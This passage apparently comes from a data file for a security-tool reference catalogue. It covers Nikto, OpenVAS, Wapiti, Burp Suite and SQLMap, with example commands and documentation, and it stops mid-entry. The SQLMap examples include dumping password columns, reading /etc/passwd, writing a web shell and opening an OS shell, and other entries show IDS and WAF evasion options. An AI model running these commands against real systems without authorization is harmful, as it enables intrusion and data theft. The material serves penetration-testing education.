targets\n\nReal-World Applications:\n• Penetration Testing: Recon phase\n• Red Team: Target profiling\n• Bug Bounty: Asset discovery\n• Threat Intelligence: Infrastructure mapping\n• OSINT Investigations: Background research\n• Due Diligence: M&A research\n• Brand Monitoring: Digital footprint\n• Security Assessments: External exposure\n\nTroubleshooting:\n• Module Errors: Check dependencies\n• API Issues: Verify key validity\n• No Results: Check SOURCE option\n• Database: Verify data insertion\n• Updates: marketplace refresh\n• Logs: Enable debug mode\n\nLegal and Ethical:\n• Authorization: Permission required\n• Public Data: Uses OSINT only\n• Scope: Stay within boundaries\n• API TOS: Respect service terms\n• Data Handling: Secure storage\n• Responsible Use: Ethical purposes only\n• Compliance: Follow local laws",
        githubUrl: "https://github.com/lanmaster53/recon-ng",
        tags: ["reconnaissance", "OSINT", "framework", "modular"]
      }
    ]
  },
  {
    id: "vulnerability-analysis",
    name: "Vulnerability Analysis",
    description: "Tools for identifying and analyzing security vulnerabilities in networks and applications",
    tools: [
      {
        id: "nikto",
        name: "Nikto",
        description: "Web server scanner which performs comprehensive tests against web servers for multiple items",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install nikto",
        usage: "Nikto is used to scan web servers for known vulnerabilities and misconfigurations. It checks for over 6700 potentially dangerous files/CGIs, outdated server versions, and specific problems on servers.",
        examples: [
          {
            title: "Basic scan",
            code: "nikto -h http://example.com"
          },
          {
            title: "Full scan with SSL",
            code: "nikto -h https://example.com -ssl"
          },
          {
            title: "Scan specific port",
            code: "nikto -h example.com -p 8080"
          },
          {
            title: "Scan multiple ports",
            code: "nikto -h example.com -p 80,443,8080,8443"
          },
          {
            title: "Scan with authentication",
            code: "nikto -h http://example.com -id username:password"
          },
          {
            title: "Use specific tuning options",
            code: "nikto -h http://example.com -Tuning 123bde"
          },
          {
            title: "Scan through proxy",
            code: "nikto -h http://example.com -useproxy http://proxy:8080"
          },
          {
            title: "Update plugins database",
            code: "nikto -update"
          },
          {
            title: "Scan with custom User-Agent",
            code: "nikto -h http://example.com -useragent \"Mozilla/5.0\""
          },
          {
            title: "Output to multiple formats",
            code: "nikto -h http://example.com -o report -Format htm,txt,csv"
          },
          {
            title: "Evasion techniques (IDS bypass)",
            code: "nikto -h http://example.com -evasion 1234567"
          },
          {
            title: "Scan from file with multiple targets",
            code: "nikto -h targets.txt"
          },
          {
            title: "Disable SSL certificate verification",
            code: "nikto -h https://example.com -ssl -no-ssl-cert"
          },
          {
            title: "Specific plugin execution",
            code: "nikto -h http://example.com -Plugins @@ALL;-@@NONE;tests(report_xml)"
          },
          {
            title: "Comprehensive scan with timing",
            code: "nikto -h http://example.com -C all -timeout 10"
          }
        ],
        documentation: "Nikto is an industry-standard open-source web server scanner created by Chris Sullo. First released in 2001, it performs comprehensive security assessments against web servers, testing for over 6,700 potentially dangerous files/programs, 1,250+ outdated server versions, and version-specific vulnerabilities across 270+ servers.\n\nCore Capabilities:\n• Server Fingerprinting: Identify web server type, version, OS\n• Dangerous Files: Detect default files, CGI scripts, backup files\n• Server Misconfigurations: Missing security headers, directory listings\n• Outdated Software: Identify known vulnerable versions\n• SSL/TLS Analysis: Certificate validation, cipher strength\n• HTTP Methods: Test for dangerous methods (PUT, DELETE, TRACE)\n• Default Credentials: Test for default admin credentials\n• XSS/SQL Injection: Basic vulnerability detection\n• Security Headers: Check for CSP, HSTS, X-Frame-Options\n\nTuning Options (-Tuning):\n• 0: File Upload - Test for file upload capabilities\n• 1: Interesting Files - Logs, configs, source code\n• 2: Misconfiguration - Server misconfigurations\n• 3: Information Disclosure - Version info, server details\n• 4: XSS - Cross-site scripting vulnerabilities\n• 5: Remote File Retrieval - Test for RFI\n• 6: Denial of Service - DoS potential\n• 7: Remote Code Execution - RCE vulnerabilities\n• 8: SQL Injection - SQLi detection\n• 9: File Inclusion - LFI/RFI tests\n• a: Authentication Bypass - Auth vulnerabilities\n• b: Software Identification - Identify installed software\n• c: Remote Source Inclusion - Include remote files\n• d: WebDAV - WebDAV detection and testing\n• e: Administrative Console - Find admin interfaces\n• x: Reverse Tuning - Exclude specific tests\n\nEvasion Techniques (-evasion):\n• 1: Random URI encoding (non-UTF8)\n• 2: Directory self-reference (/./)\n• 3: Premature URL ending\n• 4: Prepend long random string\n• 5: Fake parameter\n• 6: TAB as request spacer\n• 7: Change case of URL\n• 8: Use Windows directory separator (\\)\n• Combine: Use multiple techniques (e.g., -evasion 1234)\n\nOutput Formats (-Format):\n• csv: Comma-separated values\n• htm: HTML report with styling\n• msf+: Metasploit XML format\n• nbe: Nessus NBE format\n• txt: Plain text (default)\n• xml: Generic XML format\n• Multiple: Combine with comma (htm,txt,csv)\n\nAuthentication Support:\n• Basic Auth: -id username:password\n• NTLM: -id domain\\username:password\n• Cookie-based: -C cookie_name=value\n• Custom Headers: -H \"Header: Value\"\n• Client Certificates: -key keyfile -cert certfile\n\nAdvanced Features:\n• Plugin System: Modular architecture\n• Database Updates: Regular vulnerability feed updates\n• Custom Plugins: Write your own in Perl\n• Mutation Engine: Intelligent test case generation\n• HTTP Proxy Support: Route through Burp, ZAP, etc.\n• SSL/TLS Testing: Certificate and cipher analysis\n• Virtual Host Testing: Test multiple vhosts\n• Rate Limiting: -Pause seconds between requests\n\nPerformance Tuning:\n• -Pause N: Seconds between tests (IDS evasion)\n• -timeout N: Request timeout in seconds\n• -maxtime N: Maximum scan time\n• -Display: Control output verbosity\n• -no404: Disable 404 learning\n• -Cgidirs: Specify CGI directories\n\nProxy Configuration:\n• HTTP Proxy: -useproxy http://proxy:8080\n• SOCKS: Configure via libwhisker2\n• Authentication: proxy_username:proxy_password\n• Burp Integration: Route through Burp for manual testing\n• ZAP Integration: Combine with OWASP ZAP\n\nSSL/TLS Options:\n• -ssl: Force SSL mode\n• -nossl: Force non-SSL mode\n• -no-ssl-cert: Ignore certificate errors\n• -ssl-version: Specify SSL/TLS version\n• Certificate testing: Expiry, weak ciphers\n\nDatabase Management:\n• -update: Update vulnerability database\n• -list-plugins: Show available plugins\n• -dbcheck: Verify database integrity\n• Custom DB: Use alternative vulnerability database\n• Frequency: Update weekly for latest checks\n\nCommon Use Cases:\n• Web Server Hardening: Pre-deployment security audit\n• Compliance Testing: PCI DSS, OWASP Top 10 validation\n• Vulnerability Assessment: Initial reconnaissance\n• Configuration Review: Identify misconfigurations\n• Version Detection: Inventory web server versions\n• Penetration Testing: Automated vulnerability discovery\n• Bug Bounty: Quick vulnerability identification\n\nIntegration:\n• Nmap: Combine with NSE scripts\n• Metasploit: Import results for exploitation\n• Burp Suite: Use as reconnaissance tool\n• OWASP ZAP: Complementary scanning\n• Jenkins/CI: Automate security testing\n• SIEM: Export logs for correlation\n\nBest Practices:\n• Always get written authorization before scanning\n• Start with basic scan, then use tuning options\n• Use -Pause to avoid overwhelming servers\n• Update database regularly (-update)\n• Review false positives manually\n• Combine with manual testing\n• Use evasion for IDS bypass testing\n• Save reports in multiple formats\n• Document scan parameters\n• Test in non-production first\n\nCommon Pitfalls:\n• Scanning without authorization (illegal)\n• Overwhelming servers (DoS-like behavior)\n• Not updating database (missing vulnerabilities)\n• Ignoring false positives (bad reporting)\n• Scanning production during business hours\n• Not using -Pause with IDS/IPS present\n• Missing version-specific vulnerabilities\n• Not testing SSL/TLS properly\n\nLimitations:\n• Black-box testing only (no source code analysis)\n• High false positive rate\n• Limited JavaScript/AJAX testing\n• No authentication fuzzing\n• Basic XSS/SQLi detection only\n• Cannot test complex business logic\n• Limited modern framework support\n• Signature-based detection\n\nAlternatives and Complements:\n• Nessus: More comprehensive, commercial\n• OpenVAS: Full vulnerability management\n• Nuclei: Modern YAML-based scanner\n• WPScan: WordPress-specific\n• Skipfish: Google's web scanner\n• OWASP ZAP: Full proxy-based testing\n• Burp Suite: Professional web testing\n\nReal-World Applications:\n• Initial Reconnaissance: Quick vulnerability overview\n• Baseline Security: Establish security posture\n• Compliance Audits: Verify security controls\n• Pre-Production Testing: Catch issues before deployment\n• Continuous Monitoring: Regular security scans\n• Penetration Testing: Automated discovery phase\n• Red Team: Initial foothold identification\n• Bug Bounty: Fast vulnerability discovery",
        githubUrl: "https://github.com/sullo/nikto",
        tags: ["web", "scanner", "vulnerability", "webserver"],
        additionalInfo: "Nikto was originally written by Chris Sullo and is now maintained by a community of developers. It's included by default in many penetration testing Linux distributions like Kali Linux."
      },
      {
        id: "openvas",
        name: "OpenVAS",
        description: "Open Vulnerability Assessment Scanner is a framework of tools for vulnerability scanning and management",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install openvas",
        usage: "OpenVAS is used for network vulnerability scanning and management. It can identify security issues in systems and applications across networks.",
        examples: [
          {
            title: "Setup and start OpenVAS/GVM",
            code: "sudo gvm-setup\nsudo gvm-start"
          },
          {
            title: "Check setup status",
            code: "sudo gvm-check-setup"
          },
          {
            title: "Access Greenbone Security Assistant (web UI)",
            code: "firefox https://localhost:9392"
          },
          {
            title: "Create new target",
            code: "Configuration > Targets > New Target > Enter IP range"
          },
          {
            title: "Create scanning task with default config",
            code: "Scans > Tasks > New Task > Select target and scan config"
          },
          {
            title: "Run immediate scan",
            code: "Scans > Tasks > Select task > Start"
          },
          {
            title: "Schedule scan",
            code: "Configuration > Schedules > New Schedule > Set time/recurrence"
          },
          {
            title: "View scan results",
            code: "Scans > Results > Filter by severity"
          },
          {
            title: "Generate PDF report",
            code: "Scans > Reports > Select report > PDF"
          },
          {
            title: "Create custom scan config",
            code: "Configuration > Scan Configs > New Config > Select NVTs"
          },
          {
            title: "Update NVT feed",
            code: "sudo greenbone-nvt-sync\nsudo systemctl restart ospd-openvas"
          },
          {
            title: "CLI: List tasks",
            code: "gvm-cli socket --gmp-username admin --gmp-password admin --xml '<get_tasks/>'"
          },
          {
            title: "CLI: Start scan",
            code: "gvm-cli socket --gmp-username admin --gmp-password admin --xml '<start_task task_id=\"task-id\"/>'"
          },
          {
            title: "Create port list",
            code: "Configuration > Port Lists > New Port List > Define ports"
          },
          {
            title: "Create credential",
            code: "Configuration > Credentials > New Credential > SSH/SMB credentials"
          }
        ],
        documentation: "OpenVAS (Open Vulnerability Assessment System) is a full-featured vulnerability scanner now part of the Greenbone Vulnerability Management (GVM) framework. Originally a fork of Nessus, it's maintained by Greenbone Networks and provides enterprise-grade vulnerability assessment capabilities completely free and open source. With over 100,000 Network Vulnerability Tests (NVTs), it rivals commercial solutions.\n\nGVM Architecture:\n• GSA: Greenbone Security Assistant (web interface)\n• GVM Daemon (gvmd): Core management service\n• OSP Scanner (ospd-openvas): Actual vulnerability tests\n• PostgreSQL: Database backend\n• Redis: NVT cache\n• Notus Scanner: Advisory-based detection\n• GMP: Greenbone Management Protocol (API)\n\nCore Components:\n• OpenVAS Scanner: Executes NVTs\n• Vulnerability Tests: 100,000+ NVTs\n• Feed: Regularly updated tests (daily)\n• Manager: Task orchestration\n• CLI Tools: gvm-cli, gvm-tools\n• Python API: gvm-py library\n• Documentation: Comprehensive guides\n\nFeatures:\n• Comprehensive Coverage: CVE database integration\n• Authenticated Scanning: SSH, SMB credentials\n• Unauthenticated Scanning: Network-based tests\n• Port Scanning: Built-in port scanner\n• Service Detection: Identify versions\n• Web Application Testing: OWASP tests\n• Policy Compliance: CIS benchmarks\n• Report Generation: Multiple formats\n• Scheduling: Automated scans\n• Ticketing: Issue tracking integration\n\nNetwork Vulnerability Tests (NVTs):\n• Categories:\n  • Product Detection\n  • Default Accounts\n  • Malware Detection\n  • Denial of Service\n  • FTP, SSH, HTTP, SMB tests\n  • Database vulnerabilities\n  • Web application flaws\n• NASL: Custom test language\n• Families: Organized by service/protocol\n• Tags: Metadata (CVE, CVSS, solution)\n• Updates: Daily feed synchronization\n\nScan Configurations:\n• Full and Fast: Comprehensive coverage\n• Full and Very Deep: Maximum thoroughness\n• System Discovery: Host/service detection\n• Base: Lightweight scan\n• Discovery: Network mapping\n• Host Discovery: Live host detection\n• Custom: Select specific NVT families\n• Policy Scans: Compliance checking\n\nAuthenticated Scanning:\n• SSH: Linux/Unix systems\n  • Password authentication\n  • Key-based authentication\n  • Sudo/su privileges\n• SMB: Windows systems\n  • Domain credentials\n  • Local accounts\n  • Administrator required\n• SNMP: Network devices\n• ESXi: VMware infrastructure\n• Benefits:\n  • Patch level detection\n  • Local security checks\n  • Installed software audit\n  • Configuration review\n\nTarget Configuration:\n• Hosts: Single IP, range, CIDR\n• Exclude Hosts: Avoid critical systems\n• Port Lists: Define scan ports\n  • All IANA TCP\n  • All TCP and Nmap top 100 UDP\n  • Custom ranges\n• Alive Test: ICMP, TCP-ACK, TCP-SYN, ARP\n• Credentials: Attach for auth scanning\n• SSH Key: For key-based auth\n\nScanning Process:\n1. Target Definition: Set IP ranges\n2. Credential Setup: Auth scanning\n3. Scan Config: Choose test suite\n4. Task Creation: Combine settings\n5. Execution: Run scan\n6. Results Analysis: Review findings\n7. Reporting: Generate reports\n8. Remediation: Fix vulnerabilities\n9. Rescanning: Verify fixes\n\nVulnerability Severity:\n• Critical: CVSS 9.0-10.0\n• High: CVSS 7.0-8.9\n• Medium: CVSS 4.0-6.9\n• Low: CVSS 0.1-3.9\n• Log: Information only\n• False Positive: Mark as FP\n• CVSS: v2, v3 support\n• NVD: National Vulnerability Database\n\nResults Management:\n• Filtering:\n  • By severity\n  • By host\n  • By NVT\n  • By CVE\n• Sorting: Multiple criteria\n• Overrides: Custom severity\n• Notes: Add annotations\n• Tickets: Create for remediation\n• Delta Reports: Compare scans\n• Trending: Vulnerability trends\n\nReporting:\n• Formats:\n  • PDF: Executive/detailed\n  • XML: Machine-readable\n  • HTML: Web view\n  • CSV: Spreadsheet\n  • TXT: Plain text\n  • LaTeX: Publication\n  • ITG: IT-Grundschutz\n• Report Types:\n  • Full: Complete findings\n  • Executive: High-level summary\n  • Anonymous: No host info\n  • Topology: Network diagram\n• Customization: Templates, filters\n\nScheduling:\n• One-Time: Run once at specific time\n• Recurring:\n  • Daily\n  • Weekly\n  • Monthly\n  • Custom interval\n• Time Zone: Configure timezone\n• Alerts: Notification on completion\n• Auto-Delete: Cleanup old results\n\nAlerts and Notifications:\n• Email: SMTP notifications\n• Syslog: Log server integration\n• SNMP Trap: Network monitoring\n• HTTP GET: Webhook calls\n• Sourcefire Connector: IDS integration\n• verinice Connector: Risk management\n• Conditions: Trigger rules\n• Filters: What to report\n\nCompliance Scanning:\n• CIS Benchmarks: Center for Internet Security\n• PCI DSS: Payment Card Industry\n• HIPAA: Healthcare\n• SOX: Sarbanes-Oxley\n• ISO 27001: Information security\n• NIST: National Institute standards\n• IT-Grundschutz: German standard\n• Custom Policies: Define your own\n\nPerformance Tuning:\n• Max Concurrent NVTs: Parallel tests\n• Max Concurrent Hosts: Simultaneous targets\n• Network Timeout: Adjust for slow networks\n• Scanner Preferences:\n  • Check PCI-DSS requirements\n  • Report host details\n  • Log failed NVTs\n  • Port range\n• Resource Allocation: CPU, memory\n• Feed Optimization: Regular updates\n\nFeed Management:\n• Community Feed: Free, daily updates\n• Enterprise Feed: Commercial, hourly\n• Synchronization:\n  • greenbone-nvt-sync: NVTs\n  • greenbone-feed-sync: All feeds\n• Verification: Check feed version\n• Manual Update: Force sync\n• Automation: Cron jobs\n\nCLI Tools (gvm-cli):\n• Authentication: Username/password\n• Protocol: GMP (XML-based)\n• Commands:\n  • get_tasks: List tasks\n  • start_task: Begin scan\n  • get_results: Retrieve findings\n  • create_target: Define target\n• Scripts: gvm-script (Python)\n• Automation: CI/CD integration\n• Authentication: Socket, TLS\n\nAPI Integration (gvm-py):\n• Python Library: gvm-py\n• Connection: TLS, Unix socket\n• Methods: All GMP operations\n• Use Cases:\n  • Custom automation\n  • Integration with SIEM\n  • Ticketing system sync\n  • Custom reporting\n• Documentation: Comprehensive\n\nBest Practices:\n• Regular Updates: Daily feed sync\n• Authenticated Scans: Better accuracy\n• Scan Scheduling: Off-hours\n• Exclude Critical: Avoid production issues\n• Delta Scans: Track changes\n• False Positives: Mark and document\n• Remediation: Prioritize by CVSS\n• Rescan: Verify fixes\n• Documentation: Maintain records\n• Baselines: Establish normal state\n\nWorkflows:\n• Initial Assessment:\n  1. Discovery scan\n  2. Full scan\n  3. Review critical/high\n  4. Authenticated scan\n  5. Compliance check\n• Continuous Monitoring:\n  1. Schedule weekly scans\n  2. Alert on new criticals\n  3. Track remediation\n  4. Quarterly full scans\n• Patch Verification:\n  1. Baseline scan\n  2. Apply patches\n  3. Rescan\n  4. Delta report\n\nIntegration:\n• SIEM: Splunk, ELK, ArcSight\n• Ticketing: Jira, ServiceNow\n• GRC: Governance, Risk, Compliance tools\n• Nmap: Port scanning\n• Metasploit: Exploit verification\n• Ansible: Automation\n• Jenkins: CI/CD pipeline\n• Docker: Containerized deployment\n\nLimitations:\n• Setup Complexity: Initial configuration\n• Resource Intensive: CPU, memory, disk\n• False Positives: Require validation\n• Credentialed Access: Requires privileges\n• Network Impact: Bandwidth usage\n• Windows: Some tests require local admin\n• Web Apps: Not as deep as dedicated scanners\n\nReal-World Applications:\n• Vulnerability Management: Continuous assessment\n• Compliance Audits: Regulatory requirements\n• Penetration Testing: Recon phase\n• Patch Management: Validate updates\n• Security Audits: Internal assessments\n• Risk Assessment: Identify exposures\n• Asset Management: Inventory systems\n• Incident Response: Post-breach analysis\n\nLegal and Ethical:\n• Authorization: Written permission\n• Scope: Define boundaries\n• Timing: Minimize disruption\n• DoS: Some tests can crash services\n• Compliance: Follow regulations\n• Documentation: Audit trail\n• Data Protection: Handle results securely",
        tags: ["vulnerability", "scanner", "management", "network"],
        additionalInfo: "OpenVAS is part of the Greenbone Vulnerability Management (GVM) solution. It includes a regularly updated feed of vulnerability tests and can be integrated with other security tools."
      },
      {
        id: "wapiti",
        name: "Wapiti",
        description: "Web application vulnerability scanner that audits the security of web applications",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install wapiti",
        usage: "Wapiti scans web applications by identifying script injection points and injecting payloads to detect vulnerabilities",
        examples: [
          {
            title: "Basic scan",
            code: "wapiti -u http://example.com/"
          },
          {
            title: "Scan with authentication",
            code: "wapiti -u http://example.com/ --auth-user admin --auth-password secret"
          },
          {
            title: "Specific vulnerability modules",
            code: "wapiti -u http://example.com/ -m sql,xss,file"
          },
          {
            title: "Exclude modules",
            code: "wapiti -u http://example.com/ --skip exec,ssrf"
          },
          {
            title: "Set scope (stay within subdomain)",
            code: "wapiti -u http://example.com/ --scope domain"
          },
          {
            title: "Custom HTTP headers",
            code: "wapiti -u http://example.com/ -H 'X-Custom-Header: value'"
          },
          {
            title: "POST data testing",
            code: "wapiti -u http://example.com/login -d 'username=admin&password=test'"
          },
          {
            title: "Generate HTML report",
            code: "wapiti -u http://example.com/ -f html -o /tmp/report"
          },
          {
            title: "Generate JSON report",
            code: "wapiti -u http://example.com/ -f json -o report.json"
          },
          {
            title: "Set crawl depth",
            code: "wapiti -u http://example.com/ --depth 5"
          },
          {
            title: "Use proxy",
            code: "wapiti -u http://example.com/ --proxy http://127.0.0.1:8080"
          },
          {
            title: "Verbose output",
            code: "wapiti -u http://example.com/ -v 2"
          },
          {
            title: "Resume previous scan",
            code: "wapiti --resume /path/to/scan_folder"
          },
          {
            title: "Set timeout and max crawl time",
            code: "wapiti -u http://example.com/ --timeout 10 --max-scan-time 3600"
          }
        ],
        documentation: "Wapiti allows you to audit the security of your web applications. It performs black-box scans to find vulnerabilities such as SQL injections, XSS, CRLF injections, command execution, XXE injections, and more.",
        githubUrl: "https://github.com/wapiti-scanner/wapiti",
        tags: ["web", "scanner", "injection", "audit"]
      }
    ]
  },
  {
    id: "web-application-analysis",
    name: "Web Application Analysis",
    description: "Tools for analyzing and exploiting web applications to identify security issues",
    tools: [
      {
        id: "burpsuite",
        name: "Burp Suite",
        description: "An integrated platform for performing security testing of web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "Download from PortSwigger website",
        usage: "Burp Suite is used as a proxy for intercepting and modifying HTTP/S traffic between a browser and web servers. It provides a comprehensive suite of tools for web application penetration testing.",
        examples: [
          {
            title: "Start Burp Suite Community Edition",
            code: "burpsuite"
          },
          {
            title: "Configure browser proxy (Firefox/Chrome)",
            code: "Settings > Network > Manual proxy configuration\nHTTP Proxy: 127.0.0.1\nPort: 8080\n☑ Also use this proxy for HTTPS"
          },
          {
            title: "Install CA certificate",
            code: "1. Visit http://burp in browser\n2. Download CA certificate\n3. Import to browser's certificate store"
          },
          {
            title: "Enable intercept",
            code: "Proxy > Intercept > Intercept is on\n(Click 'Forward' to send requests)"
          },
          {
            title: "Send request to Repeater",
            code: "Right-click on request > Send to Repeater\n(Modify and resend requests manually)"
          },
          {
            title: "Send to Intruder for fuzzing",
            code: "Right-click > Send to Intruder\nPositions > Add § markers\nPayloads > Load wordlist\nStart attack"
          },
          {
            title: "Use Decoder for encoding",
            code: "Decoder tab > Paste text\nEncode as: URL, HTML, Base64, Hex\nDecode: Auto-detect encoding"
          },
          {
            title: "Compare site maps",
            code: "Target > Site map > Right-click domain\nEngagement tools > Compare site maps"
          },
          {
            title: "Active scan (Pro only)",
            code: "Right-click on request\nScan > Active scan\nSelect scan type and start"
          },
          {
            title: "Session handling rules",
            code: "Project options > Sessions\nAdd session handling rule\nScope: Select tools"
          },
          {
            title: "Match and Replace rules",
            code: "Proxy > Options > Match and Replace\nAdd rule to modify requests/responses"
          },
          {
            title: "Save project state (Pro)",
            code: "Project > Save project\nFile > Save state snapshot"
          }
        ],
        documentation: "Burp Suite is the leading web application security testing platform developed by PortSwigger. Used by over 100,000 security professionals worldwide, it's the de facto standard for web app penetration testing.\n\nCore Tools & Modules:\n• Proxy: Intercepts and modifies HTTP/HTTPS traffic between browser and server. Features include history, WebSocket support, match/replace rules, response interception\n• Repeater: Manual request manipulation and testing. Send modified requests, compare responses, analyze variations\n• Intruder: Automated fuzzing and payload delivery. Four attack types: Sniper, Battering ram, Pitchfork, Cluster bomb\n• Scanner (Pro): Automated vulnerability detection for OWASP Top 10, injection flaws, misconfigurations\n• Decoder: Encode/decode data in multiple formats. Smart analysis, custom encoding\n• Comparer: Visual diff tool for analyzing subtle differences between responses\n• Sequencer: Analyze session token randomness and predictability\n• Extender: 300+ BApp Store extensions for custom functionality\n\nProfessional Features (Pro Edition):\n• Automated Scanning: Passive and active vulnerability detection\n• Scan Scheduling: Automated periodic scans\n• Collaborator: Out-of-band interaction testing (XXE, SSRF, DNS queries)\n• Save/Resume: Project files with complete state\n• Scan Configurations: Custom scan profiles and policies\n• Reporting: Professional HTML/XML reports with evidence\n• Task Scheduler: Automated scanning workflows\n\nAdvanced Testing Techniques:\n• Session Token Analysis: Test authentication mechanisms for weaknesses\n• Race Conditions: Use Turbo Intruder extension for timing attacks\n• DOM-Based XSS: Analyze client-side JavaScript execution\n• Blind Injection: Use Collaborator for out-of-band detection\n• CSRF Testing: Generate POC forms automatically\n• API Testing: Parse OpenAPI/Swagger specs, test REST/GraphQL\n• WebSocket Testing: Intercept and modify WebSocket frames\n• HTTP/2: Full support for HTTP/2 protocol testing\n\nIntruder Attack Types:\n• Sniper: Single payload set, one position at a time (SQL injection)\n• Battering Ram: Same payload in all positions (credential stuffing)\n• Pitchfork: Multiple payload sets, iterate together (username:password pairs)\n• Cluster Bomb: Multiple payload sets, all combinations (brute force)\n\nKey Extensions (BApps):\n• Autorize: Automated authorization testing\n• Logger++: Advanced logging and grep functionality\n• Active Scan++: Enhanced vulnerability checks\n• Param Miner: Discover hidden parameters\n• JSON Web Tokens: JWT manipulation and attacks\n• Retire.js: Identify vulnerable JavaScript libraries\n• Turbo Intruder: High-speed race condition testing\n• Upload Scanner: File upload vulnerability detection\n\nPenetration Testing Workflow:\n1. Setup: Configure proxy, install CA cert, set scope\n2. Mapping: Spider/crawl application, discover endpoints\n3. Analysis: Review site map, identify attack surface\n4. Testing: Manual testing with Repeater, automated with Intruder\n5. Validation: Confirm vulnerabilities with different payloads\n6. Exploitation: Develop POCs, test impact\n7. Reporting: Document findings with evidence\n\nBest Practices:\n• Define Target Scope: Avoid testing out-of-scope domains\n• Use Display Filters: Filter HTTP history for relevant requests\n• Master Hotkeys: Ctrl+R (Repeater), Ctrl+I (Intruder), Ctrl+Shift+B (Base64)\n• Session Handling: Configure auto-login for authenticated testing\n• Throttle Requests: Use Intruder resource pool to control speed\n• Backup Projects: Save project state regularly (Pro)\n• Use Extensions: Leverage BApp Store for specialized testing\n• Configure Match/Replace: Automate header injection, token refresh\n\nCommon Testing Scenarios:\n• SQL Injection: Use Intruder with SQL payloads, analyze response times\n• XSS Testing: Inject scripts, check reflected output encoding\n• IDOR: Test sequential IDs, modify user-specific parameters\n• CSRF: Check anti-CSRF tokens, test referer validation\n• Authentication: Test password reset, session fixation, brute force\n• Authorization: Test privilege escalation, missing access controls\n• File Upload: Test file type validation, path traversal, XXE\n• Business Logic: Test workflow bypasses, race conditions\n\nPerformance Tips:\n• Disable passive scanning on large sites\n• Use match/replace instead of extensions when possible\n• Clear proxy history periodically\n• Increase Java heap size for large projects\n• Use Repeater tabs efficiently - close unused tabs\n• Filter Intruder results before analysis",
        githubUrl: "https://portswigger.net/burp",
        tags: ["web", "proxy", "interception", "testing", "scanner"],
        additionalInfo: "Burp Suite is available in Community (free) and Professional (paid) editions. The Professional edition includes additional features such as a scanner, collaborator, and project saving capabilities."
      },
      {
        id: "sqlmap",
        name: "SQLMap",
        description: "Automatic SQL injection and database takeover tool",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install sqlmap",
        usage: "SQLMap is used to detect and exploit SQL injection flaws in web applications. It automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.",
        examples: [
          {
            title: "Basic URL parameter injection test",
            code: "sqlmap -u \"http://example.com/page.php?id=1\""
          },
          {
            title: "POST request injection",
            code: "sqlmap -u \"http://example.com/login\" --data=\"username=admin&password=test\""
          },
          {
            title: "Test with authentication cookies",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --cookie=\"PHPSESSID=abc123\""
          },
          {
            title: "Enumerate databases",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"
          },
          {
            title: "Enumerate tables in specific database",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name --tables"
          },
          {
            title: "Dump specific table",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name -T users --dump"
          },
          {
            title: "Dump specific columns",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name -T users -C username,password --dump"
          },
          {
            title: "Get database banner and version",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --banner"
          },
          {
            title: "Get current user and database",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --current-user --current-db"
          },
          {
            title: "Test all parameters automatically",
            code: "sqlmap -u \"http://example.com/page.php?id=1&cat=2\" --level=5 --risk=3"
          },
          {
            title: "Specify injection technique",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --technique=BEUSTQ"
          },
          {
            title: "Time-based blind injection",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --technique=T --time-sec=5"
          },
          {
            title: "Read file from server",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --file-read=\"/etc/passwd\""
          },
          {
            title: "Write file to server",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\""
          },
          {
            title: "OS command execution",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --os-cmd=\"whoami\""
          },
          {
            title: "Get OS shell",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --os-shell"
          },
          {
            title: "SQL shell access",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --sql-shell"
          },
          {
            title: "Test specific DBMS",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dbms=mysql"
          },
          {
            title: "Use proxy for requests",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\""
          },
          {
            title: "Tamper scripts for WAF bypass",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --tamper=space2comment,between"
          },
          {
            title: "Batch mode (non-interactive)",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --batch --dbs"
          },
          {
            title: "Verbose output for debugging",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -v 3"
          }
        ],
        documentation: "SQLMap is the world's most popular open-source SQL injection automation tool. Developed by Bernardo Damele and Miroslav Stampar, it's capable of detecting and exploiting SQL injection vulnerabilities in web applications with support for over 10 database management systems.\\n\\nSupported Databases:\\n• MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite\\n• Microsoft Access, IBM DB2, Informix, SAP MaxDB, Sybase\\n• Firebird, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift\\n\\nInjection Techniques (BEUSTQ):\\n• B - Boolean-based blind: True/False responses (slow but reliable)\\n• E - Error-based: Extract data from error messages\\n• U - UNION query-based: Append results to original query (fastest)\\n• S - Stacked queries: Execute multiple statements (INSERT, UPDATE, DELETE)\\n• T - Time-based blind: Measure response delays (slowest, most stealthy)\\n• Q - Inline queries: Nested queries in SELECT statements\\n\\nDetection and Exploitation:\\n• Fingerprinting: Automatically detects DBMS type, version, architecture\\n• Enumeration: Databases, tables, columns, users, privileges, passwords\\n• Data Extraction: Dump entire databases or specific tables/columns\\n• Authentication Bypass: Exploit authentication mechanisms\\n• Password Cracking: Built-in dictionary attacks for hashed passwords\\n• Search: Find specific data across databases (SSN, emails, usernames)\\n\\nAdvanced Features:\\n• File System Access: Read/write files on the database server\\n• OS Command Execution: Execute system commands via database functions\\n• OS Shell: Get interactive shell access\\n• Registry Access: Read/write Windows registry (MSSQL)\\n• Out-of-Band Attacks: 